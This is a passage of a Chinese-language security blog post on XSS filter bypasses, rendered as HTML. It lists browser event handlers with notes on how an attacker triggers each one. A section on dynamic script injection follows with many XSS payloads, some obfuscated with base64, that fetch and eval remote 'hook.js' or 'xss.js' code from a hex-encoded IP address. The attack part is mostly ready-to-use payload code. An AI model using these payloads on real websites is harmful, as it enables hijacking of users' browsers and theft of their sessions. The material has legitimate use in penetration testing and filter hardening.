（用户或攻击者需要更改元素属性）</span><br><span class="line">onReadyStateChange() （用户或攻击者需要更改元素属性）</span><br><span class="line">onRedo() （用户在撤消事务历史记录中前进）</span><br><span class="line">onRepeat() （每次重复时间线时，事件都会触发一次，不包括第一个完整周期）</span><br><span class="line">onReset() （用户或攻击者重置表单）</span><br><span class="line">onResize()（用户将调整窗口的大小，攻击者就可以自动与像初始化：<span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span>self.resizeTo(500,400);<span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span>）</span><br><span class="line">onResizeEnd()（用户将调整窗口的大小，攻击者就可以自动与像初始化：<span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span>self.resizeTo(500,400);<span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span>）</span><br><span class="line">onResizeStart()（用户将调整窗口的大小，攻击者就可以自动与像初始化：<span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span>self.resizeTo(500,400);<span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span>）</span><br><span class="line">onResume() （onresume事件触发时间线恢复时变为活动的每个元素，包括body元素）</span><br><span class="line">onReverse() （如果元素的repeatCount大于1，则每次时间轴开始向后播放时都会触发此事件）</span><br><span class="line">onRowsEnter() （用户或攻击者需要更改数据源中的行）</span><br><span class="line">onRowExit() （用户或攻击者需要更改数据源中的行）</span><br><span class="line">onRowDelete() （用户或攻击者需要删除数据源中的行）</span><br><span class="line">onRowInserted() （用户或攻击者需要在数据源中插入一行）</span><br><span class="line">onScroll()（用户需要滚动，否则攻击者可以使用该scrollBy()功能）</span><br><span class="line">onSeek() （当时间轴设置为向前以外的任何方向播放时，onreverse事件将触发）</span><br><span class="line">onSelect()（用户需要选择一些文本-攻击者就可以自动与像初始化：window.document.execCommand(&quot;SelectAll&quot;);）</span><br><span class="line">onSelectionChange()（用户需要选择一些文本-攻击者就可以自动与像初始化：window.document.execCommand(&quot;SelectAll&quot;);）</span><br><span class="line">onSelectStart()（用户需要选择一些文本-攻击者就可以自动与像初始化：window.document.execCommand(&quot;SelectAll&quot;);）</span><br><span class="line">onStart() （在每个选框循环的开头触发）</span><br><span class="line">onStop() （用户需要按停止按钮或离开网页）</span><br><span class="line">onStorage() （存储区域改变了）</span><br><span class="line">onSyncRestored() （用户中断元素播放其播放时间轴所定义的媒体的能力）</span><br><span class="line">onSubmit() （要求攻击者或用户提交表单）</span><br><span class="line">onTimeError() （用户或攻击者将时间属性（如dur）设置为无效值）</span><br><span class="line">onTrackChange() （用户或攻击者更改播放列表中的曲目）</span><br><span class="line">onUndo() （用户在撤消事务历史记录中后退）</span><br><span class="line">onUnload() （当用户点击任何链接或按下后退按钮或攻击者强制点击时）</span><br><span class="line">onURLFlip() （当由HTML + TIME（定时交互式多媒体扩展）媒体标记播放的高级流格式（ASF）文件处理嵌入在ASF文件中的脚本命令时，此事件将触发）</span><br><span class="line">seekSegmentTime() （这是一种在元素的段时间线上定位指定点并从该点开始播放的方法。该段包含一次重复的时间线，包括使用AUTOREVERSE属性进行反向播放。）</span><br></pre></td></tr></table></figure>
+
+<h1 id="动态添加"><a href="#动态添加" class="headerlink" title="动态添加"></a>动态添加</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"># javascript append <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">## no ;</span><br><span class="line"><span class="javascript"><span class="keyword">with</span>(<span class="built_in">document</span>)(body||<span class="built_in">document</span>.getElementsByTagName(<span class="string">&#x27;head&#x27;</span>)[<span class="number">0</span>]||documentElement).appendChild(createElement(<span class="string">&#x27;script&#x27;</span>)).src=<span class="string">&#x27;//0xc0a832e8/hook.js&#x27;</span></span></span><br><span class="line"></span><br><span class="line">## base64 encoder</span><br><span class="line"><span class="javascript"><span class="keyword">var</span> s=<span class="built_in">document</span>.createElement(<span class="string">&quot;script&quot;</span>);s.src=<span class="built_in">window</span>.atob(<span class="string">&quot;Ly8weGMwYTgzMmU4L2hvb2suanM=&quot;</span>);$(<span class="string">&quot;head&quot;</span>).append(s);</span></span><br><span class="line"></span><br><span class="line">## more short</span><br><span class="line"><span class="javascript"><span class="keyword">var</span> s=<span class="built_in">document</span>.createElement(<span class="string">&quot;script&quot;</span>);s.type=<span class="string">&quot;text/javascript&quot;</span>;s.src=<span class="string">&quot;//0xc0a832e8/hook.js&quot;</span>;$(<span class="string">&quot;head&quot;</span>).append(s);</span></span><br><span class="line"></span><br><span class="line">## more short !</span><br><span class="line"><span class="javascript"><span class="keyword">var</span> s=<span class="built_in">document</span>.createElement(<span class="string">&quot;script&quot;</span>);s.src=<span class="string">&quot;//0xc0a832e8/hook.js&quot;</span>;$(<span class="string">&quot;head&quot;</span>).append(s);</span></span><br><span class="line"></span><br><span class="line">##</span><br><span class="line"><span class="javascript"><span class="keyword">var</span> s=<span class="built_in">document</span>.createElement(<span class="string">&quot;script&quot;</span>);$(<span class="string">&quot;head&quot;</span>).append(s);s.src=<span class="string">&quot;//0xc0a832e8/hook.js&quot;</span>;</span></span><br><span class="line"></span><br><span class="line">##</span><br><span class="line"><span class="javascript">&#123;s=<span class="built_in">document</span>.createElement(<span class="string">&quot;script&quot;</span>)&#125;&#123;$(<span class="string">&quot;head&quot;</span>).append(s)&#125;&#123;s.src=<span class="string">&quot;//0xc0a832e8/hook.js&quot;</span>&#125;</span></span><br><span class="line"><span class="javascript">&#123;s=<span class="built_in">document</span>.createElement(<span class="string">&#x27;script&#x27;</span>)&#125;&#123;$(<span class="string">&#x27;head&#x27;</span>).append(s)&#125;&#123;s.src=<span class="string">&#x27;//0xc0a832e8/hook.js&#x27;</span>&#125;</span></span><br><span class="line"></span><br><span class="line">##</span><br><span class="line"><span class="javascript">s=<span class="built_in">document</span>.createElement(<span class="string">&quot;script&quot;</span>);$(<span class="string">&quot;head&quot;</span>).append(s);s.src=<span class="string">&quot;//0xc0a832e8/hook.js&quot;</span>;</span></span><br><span class="line"></span><br><span class="line">##</span><br><span class="line"><span class="javascript">s=<span class="built_in">document</span>.createElement(<span class="string">&#x27;script&#x27;</span>);$(<span class="string">&#x27;head&#x27;</span>).append(s);s.src=<span class="string">&#x27;//0xc0a832e8/hook.js&#x27;</span></span></span><br><span class="line"></span><br><span class="line">﻿# 引入第三方js</span><br><span class="line"></span><br><span class="line">## fetch() 方法</span><br><span class="line"><span class="javascript">fetch(<span class="string">&#x27;//0xc0a832e8/xss.js&#x27;</span>).then(<span class="function"><span class="params">a</span>=&gt;</span>a.text().then(<span class="function"><span class="params">a</span>=&gt;</span><span class="built_in">eval</span>(a)))</span></span><br><span class="line"></span><br><span class="line">## import() 方法</span><br><span class="line"><span class="javascript"><span class="keyword">import</span>(<span class="string">&#x27;//0xc0a832e8/xss.js&#x27;</span>)</span></span><br><span class="line"><span class="javascript">&lt;<span class="keyword">import</span> onload=<span class="string">&quot;import(&#x27;////0xc0a832e8&#x27;)&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">## appendChild() 动态添加</span><br><span class="line"><span class="javascript"><span class="keyword">with</span>(<span class="built_in">document</span>)[head.appendChild(createElement(<span class="string">&#x27;script&#x27;</span>)).src=<span class="string">&#x27;//0xc0a832e8/xss.js&#x27;</span>]</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.head.appendChild(<span class="built_in">document</span>.createElement(<span class="string">&#x27;script&#x27;</span>)).src=<span class="string">&#x27;//0xc0a832e8/xss.js&#x27;</span>;<span class="string">`;</span></span></span><br></pre></td></tr></table></figure>
+
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	<span id="/post/XSS_Bypass/" class="leancloud-visitors view" data-flag-title="XSS_Bypass">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/post/SQLI_Bypass/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/post/Phishing_WebIM/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2023-05-02 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/反诈打击/">反诈打击<span>71</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/刷单类/">刷单类<span>7</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E7%89%B9%E6%AE%8Abypass"><span class="toc-article-text">特殊bypass</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E7%BC%96%E7%A0%81%E5%8F%98%E5%BD%A2"><span class="toc-article-text">编码变形</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#SCRIPT"><span class="toc-article-text">SCRIPT</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#LINK"><span class="toc-article-text">LINK</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#INPUT"><span class="toc-article-text">INPUT</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#IMG"><span class="toc-article-text">IMG</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#SVG"><span class="toc-article-text">SVG</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#IFRAME"><span class="toc-article-text">IFRAME</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#SELECT"><span class="toc-article-text">SELECT</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#AUDIO"><span class="toc-article-text">AUDIO</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E7%BC%96%E7%A0%81%E4%BA%8B%E4%BB%B6"><span class="toc-article-text">编码事件</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E4%BA%8B%E4%BB%B6%E5%A4%A7%E5%85%A8"><span class="toc-article-text">事件大全</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E5%8A%A8%E6%80%81%E6%B7%BB%E5%8A%A0"><span class="toc-article-text">动态添加</span></a></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2024 hitman's Blog
+  
+      . wubba <a href="http://hexo.io/" target="_blank">lubba</a> dub <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank"> dub.</a>  
+</p>
+
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
